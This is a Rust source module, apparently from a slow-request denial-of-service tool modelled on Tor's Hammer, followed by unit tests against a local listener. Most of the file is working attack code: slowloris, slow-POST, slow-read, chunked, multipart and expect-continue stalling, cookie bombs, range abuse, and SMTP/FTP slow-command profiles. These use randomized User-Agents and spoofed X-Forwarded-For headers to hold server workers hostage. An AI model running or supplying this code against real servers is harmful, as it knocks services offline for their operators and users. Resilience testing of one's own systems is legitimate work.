//! Attack profiles: each profile opens one connection and slowly consumes it
//! so a vulnerable server ties up a worker waiting on an incomplete request.
//!
//! This module mirrors `src/torshammer/profiles.py` profile for profile so the
//! two backends produce equivalent slow-request traffic:
//!
//! * `slow-post`        - headers with a big `Content-Length`, body dripped one
//!   byte at a time (classic Tor's Hammer).
//! * `slow-post-headers` - request line and headers leaked one line at a time,
//!   then the body is dripped byte by byte.
//! * `slow-headers`     - never finish the request headers (slowloris).
//! * `slow-read`        - full request, then read the response in tiny chunks
//!   with pauses (slow-read / slow-bytes).
//! * `chunked`          - `Transfer-Encoding: chunked` body dripped in small
//!   chunks without the terminating 0-chunk.
//! * `multipart-slow-upload` - `multipart/form-data` POST, MIME-part content
//!   dribbled slowly, closing boundary never emitted.
//! * `expect-continue-abuse` - `Expect: 100-continue` headers, then the body
//!   stalls after the interim server response.

use super::rng::Rng;
use super::signals;
use super::stats::Stats;
use super::EngineConfig;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

const ACCEPTS: &[&str] = &[
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
];

/// Built-in User-Agent pool (Python loads these from `--user-agents`; the Rust
/// engine always randomizes from this built-in list).
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (compatible; TorsHammer/2.0)",
];

const ALNUM_BYTES: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

/// Run the profile for the current mode on an established connection.
///
/// Returns `true` if the profile completed naturally, `false` if the run was
/// interrupted by the stop flag.
pub fn run_profile(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    match config.mode.as_str() {
        "slow-post" => slow_post(config, stream, stats, running, rng),
        "slow-post-headers" => slow_post_headers(config, stream, stats, running, rng),
        "slow-headers" => slow_headers(config, stream, stats, running, rng),
        "slow-read" => slow_read(config, stream, stats, running, rng),
        "chunked" => chunked(config, stream, stats, running, rng),
        "websocket-slow-upgrade" => websocket_slow_upgrade(config, stream, stats, running, rng),
        "http-pipelining" => http_pipelining(config, stream, stats, running, rng),
        "range-abuse" => range_abuse(config, stream, stats, running, rng),
        "cookie-bomb" => cookie_bomb(config, stream, stats, running, rng),
        "jsonrpc-slow" => jsonrpc_slow(config, stream, stats, running, rng),
        "smtp-slow-envelope" => smtp_slow_envelope(config, stream, stats, running, rng),
        "ftp-slow-command" => ftp_slow_command(config, stream, stats, running, rng),
        "multipart-slow-upload" => multipart_slow_upload(config, stream, stats, running, rng),
        "expect-continue-abuse" => expect_continue_abuse(config, stream, stats, running, rng),
        _ => false,
    }
}

fn should_stop(running: &AtomicBool) -> bool {
    !running.load(Ordering::Relaxed) || signals::shutdown_requested()
}

fn write_full(stream: &mut TcpStream, data: &[u8], stats: &Stats) -> io::Result<()> {
    stream.write_all(data)?;
    stats.add_sent(data.len() as u64);
    Ok(())
}

fn halt(rng: &mut Rng, config: &EngineConfig, running: &AtomicBool) {
    // Zero delay means "no waiting at all": skip both the PRNG draw and the
    // (blocking) sleep slices. The attack loop itself is the throttle here;
    // without this fast path, unit tests with delay_min = delay_max = 0.0
    // would still burn real seconds inside sleep_slices.
    if config.delay_min <= 0.0 && config.delay_max <= 0.0 {
        return;
    }
    let delay = rng.range_f64(config.delay_min, config.delay_max);
    super::sleep_slices(running, delay);
}

fn request_path(config: &EngineConfig, rng: &mut Rng) -> String {
    if !config.randomize_path {
        return config.path.clone();
    }
    let separator = if config.path.contains('?') { "&" } else { "?" };
    format!("{}{}{}", config.path, separator, rng.alnum(9))
}

fn base_headers(config: &EngineConfig, rng: &mut Rng) -> Vec<String> {
    let mut headers = vec![
        format!("Host: {}", config.header_host),
        format!("User-Agent: {}", rng.choice(USER_AGENTS)),
        format!("Accept: {}", rng.choice(ACCEPTS)),
        "Accept-Language: en-US,en;q=0.9".to_string(),
        "Accept-Encoding: gzip, deflate".to_string(),
        "Connection: keep-alive".to_string(),
        "Keep-Alive: 900".to_string(),
        "X-Requested-With: XMLHttpRequest".to_string(),
    ];
    if rng.chance(0.5) {
        headers.push(format!("Referer: https://{}/", config.header_host));
    }
    if rng.chance(0.35) {
        headers.push("Cache-Control: no-cache".to_string());
    }
    if rng.chance(0.25) {
        headers.push("DNT: 1".to_string());
    }
    if rng.chance(0.25) {
        headers.push("TE: trailers, deflate".to_string());
    }
    if rng.chance(0.5) {
        headers.push(format!("X-Forwarded-For: {}", rng.random_ip()));
    }
    if rng.chance(0.4) {
        headers.push(format!("X-Trace-Id: {}", rng.hex(6)));
    }
    // Custom headers override defaults (case-insensitive name match).
    for (name, value) in &config.custom_headers {
        let lower = name.to_ascii_lowercase();
        headers.retain(|line| {
            let existing = line.split(':').next().unwrap_or("").trim();
            !existing.eq_ignore_ascii_case(&lower)
        });
        headers.push(format!("{name}: {value}"));
    }
    headers
}

fn dribble(rng: &mut Rng) -> u8 {
    ALNUM_BYTES[rng.range_usize(0, ALNUM_BYTES.len() - 1)]
}

fn websocket_slow_upgrade(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let mut headers = base_headers(config, rng);

    // Add WebSocket-specific headers
    headers.push("Upgrade: websocket".to_string());
    headers.push("Connection: Upgrade".to_string());

    // Generate WebSocket key (random base64)
    let ws_key_bytes: Vec<u8> = (0..16).map(|_| rng.range_u8(0, 254)).collect();
    let ws_key = STANDARD.encode(&ws_key_bytes);
    headers.push(format!("Sec-WebSocket-Key: {ws_key}"));
    headers.push("Sec-WebSocket-Version: 13".to_string());

    if rng.chance(0.5) {
        headers.push("Sec-WebSocket-Protocol: chat".to_string());
    }

    // Send request line
    let request = format!("{} {}\r\n", method, request_path(config, rng));
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    // Slowly send headers one by one
    for header in headers {
        if should_stop(running) {
            return false;
        }
        if write_full(stream, format!("{}\r\n", header).as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
    }

    // Never send the terminating blank line to keep upgrade incomplete
    while !should_stop(running) {
        // Continue sending random X-headers to keep connection alive
        let key = format!("X-{}", rng.hex(6));
        let value = rng.hex(8);
        if write_full(stream, format!("{key}: {value}\r\n").as_bytes(), stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn http_pipelining(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let headers = base_headers(config, rng);
    let request = format!(
        "{} {}\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    );

    // Send multiple requests in pipeline
    let mut request_count = 0;
    while !should_stop(running) && request_count < 50 {
        if write_full(stream, request.as_bytes(), stats).is_err() {
            break;
        }
        request_count += 1;
        // Small delay between requests to keep connection alive
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn range_abuse(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());

    // Send many byte range requests to exhaust file handle limits
    let mut request_count = 0;
    while !should_stop(running) && request_count < 100 {
        let mut headers = base_headers(config, rng);

        // Add random Range header
        let start = rng.range_usize(0, 1_000_000);
        let end = start + rng.range_usize(100, 10_000);
        headers.push(format!("Range: bytes={start}-{end}"));

        let request = format!(
            "{} {}\r\n{}\r\n\r\n",
            method,
            request_path(config, rng),
            headers.join("\r\n")
        );

        if write_full(stream, request.as_bytes(), stats).is_err() {
            break;
        }
        request_count += 1;
        // Small delay between requests
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn cookie_bomb(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let mut headers = base_headers(config, rng);

    // Generate large cookie value (10KB for testing, can be larger in production)
    let cookie_size = 10 * 1024; // 10KB (reduced from 1MB for test performance)
    let cookie_value = rng.alnum(cookie_size);
    let cookie_name = "bomb_cookie";

    // Replace existing cookie if present, or add new one
    headers.retain(|h| !h.to_ascii_lowercase().starts_with("cookie:"));
    headers.push(format!("Cookie: {cookie_name}={cookie_value}"));

    let request = format!(
        "{} {}\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    );

    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    // Keep connection alive with periodic keep-alive headers
    while !should_stop(running) {
        halt(rng, config, running);
        // Send small keep-alive data to maintain connection
        if rng.chance(0.1) {
            // 10% chance to send keep-alive
            if write_full(stream, b"X-Keep-Alive: 1\r\n", stats).is_err() {
                break;
            }
        }
    }

    !should_stop(running)
}

fn jsonrpc_slow(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/json".to_string());

    // Generate JSON-RPC payload (partial, never completed)
    let json_payload = r#"{"jsonrpc":"2.0","method":"slow_method","params":["#;
    let json_length = json_payload.len();

    headers.push(format!("Content-Length: {}", json_length + 1000)); // Claim larger size

    let request = format!(
        "{} {}\r\n{}\r\n\r\n",
        method,
        request_path(config, rng),
        headers.join("\r\n")
    );

    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    // Slowly send JSON payload character by character
    let mut sent = 0;
    while !should_stop(running) && sent < json_payload.len() {
        let byte = json_payload.as_bytes()[sent];
        if write_full(stream, &[byte], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }

    // Continue sending partial JSON data without completion
    while !should_stop(running) {
        if write_full(stream, br#""param","#, stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn smtp_slow_envelope(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Slowly send SMTP envelope commands
    let smtp_commands = vec![
        format!("EHLO {}", config.header_host),
        "MAIL FROM: <slow-test@example.com>".to_string(),
        "RCPT TO: <recipient@example.com>".to_string(),
    ];

    for cmd in smtp_commands {
        if should_stop(running) {
            return false;
        }
        if write_full(stream, format!("{}\r\n", cmd).as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
    }

    // Never send DATA command to keep envelope incomplete
    while !should_stop(running) {
        // Continue sending incomplete RCPT TO commands
        if write_full(stream, b"RCPT TO: <another@example.com>\r\n", stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn ftp_slow_command(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Slowly send FTP commands
    let ftp_commands = vec![
        "USER anonymous".to_string(),
        "PASS test@example.com".to_string(),
        "PASV".to_string(),
    ];

    for cmd in ftp_commands {
        if should_stop(running) {
            return false;
        }
        if write_full(stream, format!("{}\r\n", cmd).as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
    }

    // Never complete data transfer
    while !should_stop(running) {
        // Continue sending PASV commands
        if write_full(stream, b"PASV\r\n", stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn multipart_boundary(rng: &mut Rng) -> String {
    rng.alnum(24)
}

/// Names the caller explicitly programmed via `--header` (case-insensitive).
fn custom_header_names(config: &EngineConfig) -> Vec<String> {
    config
        .custom_headers
        .iter()
        .map(|(name, _)| name.to_ascii_lowercase())
        .collect()
}

fn multipart_slow_upload(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Multipart uploads exercise a different parser/handling path than the
    // opaque bodies sent by slow-post/chunked (boundary scanning, part
    // buffering, temp-file handling on real upload endpoints). Emit the
    // headers line by line, then dribble MIME-part content forever,
    // withholding the closing boundary so the upload never completes.
    let boundary = multipart_boundary(rng);
    let sep = format!("------WebKitFormBoundary{boundary}");
    let ctype = format!("multipart/form-data; boundary={sep}");

    let mut lines = vec![format!(
        "{} {} HTTP/1.1",
        config.method.clone().unwrap_or_else(|| "POST".to_string()),
        request_path(config, rng)
    )];
    // `--header Expect:...` must not leak into multipart: it would turn the
    // upload into an expect/continue transaction, and this profile is the
    // multipart one. A custom body is dribbled as-is below; Content-Length
    // is always the multipart byte budget either way.
    let custom = custom_header_names(config);
    for line in base_headers(config, rng) {
        let existing = line.split(':').next().unwrap_or("").trim();
        if existing.eq_ignore_ascii_case("expect") && !custom.contains(&"expect".to_string()) {
            continue;
        }
        lines.push(line);
    }
    lines.push(format!("Content-Type: {ctype}"));
    lines.push(format!("Content-Length: {}", config.base_post_length));
    for line in lines {
        if should_stop(running) {
            return false;
        }
        if write_full(stream, format!("{line}\r\n").as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
    }
    if should_stop(running) {
        return false;
    }
    if write_full(stream, b"\r\n", stats).is_err() {
        return false;
    }
    if should_stop(running) {
        return false;
    }

    // A realistic file-upload preamble, then endless slow part content
    // with only non-closing boundaries so the body never terminates.
    let filename = rng.alnum(10);
    let prelude = format!(
        "{sep}\r\n\
         Content-Disposition: form-data; name=\"upload\"; filename=\"{filename}.bin\"\r\n\
         Content-Type: application/octet-stream\r\n\
         \r\n"
    );
    if write_full(stream, prelude.as_bytes(), stats).is_err() {
        return false;
    }
    let mut part = 0usize;
    // Countdown to the next non-final boundary instead of `part % 64 == 0`:
    // equivalent behaviour (fires at 64, 128, ...) while staying clean under
    // both the pinned clippy (rust 1.75) and modern `manual_is_multiple_of`.
    let mut since_boundary: usize = 64;
    while !should_stop(running) {
        if write_full(stream, &[dribble(rng)], stats).is_err() {
            break;
        }
        part += 1;
        since_boundary -= 1;
        if since_boundary == 0 {
            since_boundary = 64;
            // Emit a fresh non-final boundary every so often: it keeps
            // multipart parsers scanning and buffering without ever
            // signalling the end of the upload.
            let chunk = format!(
                "\r\n{sep}\r\nContent-Disposition: form-data; name=\"field{part}\"\r\n\r\n"
            );
            if write_full(stream, chunk.as_bytes(), stats).is_err() {
                break;
            }
        }
        halt(rng, config, running);
    }

    !should_stop(running)
}

fn expect_continue_abuse(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    // Announce a body with `Expect: 100-continue`, consume the interim
    // response if the server sends one, then stall the body itself. Any
    // state the server allocated on its `100 Continue` decision (worker,
    // upload buffer) stays pinned while the connection is held open.
    let length = rng.range_usize(
        (config.base_post_length / 2).max(1),
        config.base_post_length,
    );

    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    headers.push(format!("Content-Length: {length}"));
    // A caller-supplied `Expect:` (via --header, already merged by
    // base_headers) wins over the default: no duplicate lines either way.
    if !custom_header_names(config).contains(&"expect".to_string()) {
        headers.push("Expect: 100-continue".to_string());
    }
    let request = format!(
        "{method} {} HTTP/1.1\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    // Give the server a beat to answer with `100 Continue` (or a final
    // rejection); consume whatever arrived without blocking past the
    // configured read deadline, then keep the promised body stalled.
    //
    // NOTE: the interim read runs on its own deadline and never persists it
    // onto the stream: the attack path below relies on blocking writes, and
    // a stale read timeout would put every subsequent body byte on that
    // same short clock.
    let timeout = Duration::from_secs_f64(config.connect_timeout.max(0.5));
    let _ = stream.set_read_timeout(Some(timeout));
    let mut interim = [0u8; 1024];
    match stream.read(&mut interim) {
        Ok(0) => return false, // server closed the connection outright
        Ok(n) => stats.add_received(n as u64),
        Err(ref err)
            if err.kind() == io::ErrorKind::WouldBlock || err.kind() == io::ErrorKind::TimedOut => {
        }
        Err(_) => return false,
    }
    let _ = stream.set_read_timeout(None);
    if should_stop(running) {
        return false;
    }

    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        if write_full(stream, &[dribble(rng)], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }
    // Even after the announced byte count is exhausted, hold the socket
    // open instead of closing it.
    while !should_stop(running) {
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn slow_post(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let length = match &config.custom_body {
        Some(body) => body.len(),
        None => rng.range_usize(
            (config.base_post_length / 2).max(1),
            config.base_post_length,
        ),
    };
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    headers.push(format!("Content-Length: {length}"));
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let request = format!(
        "{method} {}\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        let byte = match &config.custom_body {
            Some(body) => body[sent],
            None => dribble(rng),
        };
        if write_full(stream, &[byte], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn slow_post_headers(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let length = rng.range_usize(
        (config.base_post_length / 2).max(1),
        config.base_post_length,
    );
    let mut headers = base_headers(config, rng);
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    headers.push(format!("Content-Length: {length}"));
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let mut lines = vec![format!("{method} {}", request_path(config, rng))];
    lines.extend(headers);

    let mut index = 0usize;
    while index < lines.len() && !should_stop(running) {
        if write_full(stream, format!("{}\r\n", lines[index]).as_bytes(), stats).is_err() {
            return !should_stop(running);
        }
        index += 1;
        halt(rng, config, running);
    }
    if !should_stop(running) {
        let _ = write_full(stream, b"\r\n", stats);
    }
    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        if write_full(stream, &[dribble(rng)], stats).is_err() {
            break;
        }
        sent += 1;
        halt(rng, config, running);
    }
    !should_stop(running)
}

fn slow_headers(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let request = format!("{method} {}\r\n", request_path(config, rng));
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    for (name, value) in &config.custom_headers {
        if write_full(stream, format!("{name}: {value}\r\n").as_bytes(), stats).is_err() {
            return false;
        }
        halt(rng, config, running);
        if should_stop(running) {
            break;
        }
    }
    while !should_stop(running) {
        let key = format!("X-{}", rng.hex(6));
        let value = rng.hex(8);
        if write_full(stream, format!("{key}: {value}\r\n").as_bytes(), stats).is_err() {
            break;
        }
        halt(rng, config, running);
    }
    !should_stop(running)
}
fn slow_read(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let headers = base_headers(config, rng);
    let method = config.method.clone().unwrap_or_else(|| "GET".to_string());
    let request = format!(
        "{method} {}\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }
    let timeout = Duration::from_secs_f64((config.connect_timeout * 2.0).max(1.0));
    let _ = stream.set_read_timeout(Some(timeout));

    let mut buffer = [0u8; 8];
    loop {
        if should_stop(running) {
            break;
        }
        match stream.read(&mut buffer) {
            Ok(0) => break, // server closed the connection
            Ok(n) => {
                stats.add_received(n as u64);
                halt(rng, config, running);
            }
            Err(ref err)
                if err.kind() == io::ErrorKind::WouldBlock
                    || err.kind() == io::ErrorKind::TimedOut =>
            {
                continue;
            }
            Err(_) => break,
        }
    }
    !should_stop(running)
}

fn chunked(
    config: &EngineConfig,
    stream: &mut TcpStream,
    stats: &Stats,
    running: &AtomicBool,
    rng: &mut Rng,
) -> bool {
    let length = match &config.custom_body {
        Some(body) => body.len(),
        None => rng.range_usize(
            (config.base_post_length / 2).max(1),
            config.base_post_length,
        ),
    };
    let mut headers = base_headers(config, rng);
    headers.push("Transfer-Encoding: chunked".to_string());
    headers.push("Content-Type: application/x-www-form-urlencoded".to_string());
    let method = config.method.clone().unwrap_or_else(|| "POST".to_string());
    let request = format!(
        "{method} {}\r\n{}\r\n\r\n",
        request_path(config, rng),
        headers.join("\r\n")
    );
    if write_full(stream, request.as_bytes(), stats).is_err() {
        return false;
    }

    let mut sent = 0usize;
    while !should_stop(running) && sent < length {
        let size = rng.range_usize(1, 4).min(length - sent);
        let payload: Vec<u8> = match &config.custom_body {
            Some(body) => body[sent..sent + size].to_vec(),
            None => (0..size).map(|_| dribble(rng)).collect(),
        };
        let mut frame = format!("{size:x}\r\n").into_bytes();
        frame.extend_from_slice(&payload);
        frame.extend_from_slice(b"\r\n");
        if write_full(stream, &frame, stats).is_err() {
            break;
        }
        sent += size;
        halt(rng, config, running);
    }
    !should_stop(running)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;

    fn config(mode: &str) -> EngineConfig {
        EngineConfig {
            host: "127.0.0.1".into(),
            port: 9,
            path: "/".into(),
            header_host: "127.0.0.1".into(),
            secure: false,
            mode: mode.into(),
            concurrency: 1,
            duration: 0.0,
            delay_min: 0.0,
            delay_max: 0.001,
            connect_timeout: 3.0,
            base_post_length: 8,
            randomize_path: false,
            method: None,
            custom_headers: vec![("X-Custom".to_string(), "ok".to_string())],
            custom_body: None,
            json: false,
            stats_interval: 1.0,
            quiet: true,
            verbose: false,
            max_errors: 0,
            fail_under: 0,
            fail_on_zero: false,
        }
    }

    #[test]
    fn slow_post_sends_headers_then_drips_full_body() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_secs(3)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            loop {
                match sock.read(&mut tmp) {
                    Ok(0) => break,
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() >= 512 {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("slow-post");
        let mut rng = Rng::new(1);
        let stats = Stats::new();
        let running = AtomicBool::new(true);
        let mut stream = TcpStream::connect(addr).unwrap();
        let completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();

        assert!(completed, "slow-post should complete on stop=true");
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.starts_with("POST /"), "missing request line: {text}");
        assert!(text.contains("Content-Length: 8"), "missing length: {text}");
        assert!(
            text.contains("X-Custom: ok"),
            "missing custom header: {text}"
        );

        let header_end = text.find("\r\n\r\n").expect("header terminator") + 4;
        assert_eq!(
            received.len() - header_end,
            8,
            "expected exactly 8 dripped body bytes"
        );
    }

    #[test]
    fn slow_headers_never_terminates_request() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("slow-headers");
        let mut rng = Rng::new(2);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        // The profile only exits when the stop flag fires; flip it after a
        // short window from another thread so this test cannot deadlock.
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(50));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        // With `running=true` this profile never terminates, so after a short
        // window we interrupt via shutdown and it reports `false`.
        assert!(!completed, "interrupted profile must not report completion");
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.starts_with("GET /"), "missing request line: {text}");
        assert!(!text.contains("\r\n\r\n"), "headers must never terminate");
        assert!(text.contains("X-Custom: ok"));
    }

    #[test]
    fn websocket_slow_upgrade_sends_websocket_headers() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("websocket-slow-upgrade");
        let mut rng = Rng::new(3);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(50));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        assert!(!completed, "interrupted profile must not report completion");
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.starts_with("GET /"), "missing request line: {text}");
        assert!(
            text.contains("Upgrade: websocket"),
            "missing WebSocket upgrade header"
        );
        assert!(
            text.contains("Connection: Upgrade"),
            "missing Connection header"
        );
        assert!(text.contains("Sec-WebSocket-Key:"), "missing WebSocket key");
        assert!(
            text.contains("Sec-WebSocket-Version: 13"),
            "missing WebSocket version"
        );
    }

    #[test]
    fn http_pipelining_sends_multiple_requests() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("http-pipelining");
        let mut rng = Rng::new(4);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20)); // Shorter delay to ensure interruption
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        // http-pipelining may complete before interruption if it's fast enough
        // Just verify it sends multiple requests
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.starts_with("GET /"), "missing request line: {text}");
        // Count how many times "GET /" appears (each request starts with this)
        let request_count = text.matches("GET /").count();
        assert!(
            request_count > 1,
            "expected multiple requests, got {request_count}"
        );
    }

    #[test]
    fn range_abuse_sends_range_headers() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
